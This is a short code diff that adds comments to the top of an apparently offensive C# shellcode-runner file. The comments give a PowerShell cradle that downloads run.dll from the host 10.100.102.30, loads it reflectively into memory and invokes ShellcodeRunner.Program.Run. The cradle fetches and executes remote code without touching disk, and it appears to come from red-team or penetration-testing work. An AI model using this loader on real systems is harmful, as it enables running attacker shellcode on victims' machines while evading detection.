@@ -1,3 +1,10 @@
+// Reflective loading with:
+// $data = (New-Object System.Net.WebClient).DownloadData('http://10.100.102.30/run.dll')
+// $assem = [System.Reflection.Assembly]::Load($data)
+// $class = $assem.GetType("ShellcodeRunner.Program")
+// $method = $class.GetMethod("Run")
+// $method.Invoke(0, $null)
+//
 using System;
 using System.Runtime.InteropServices;
 
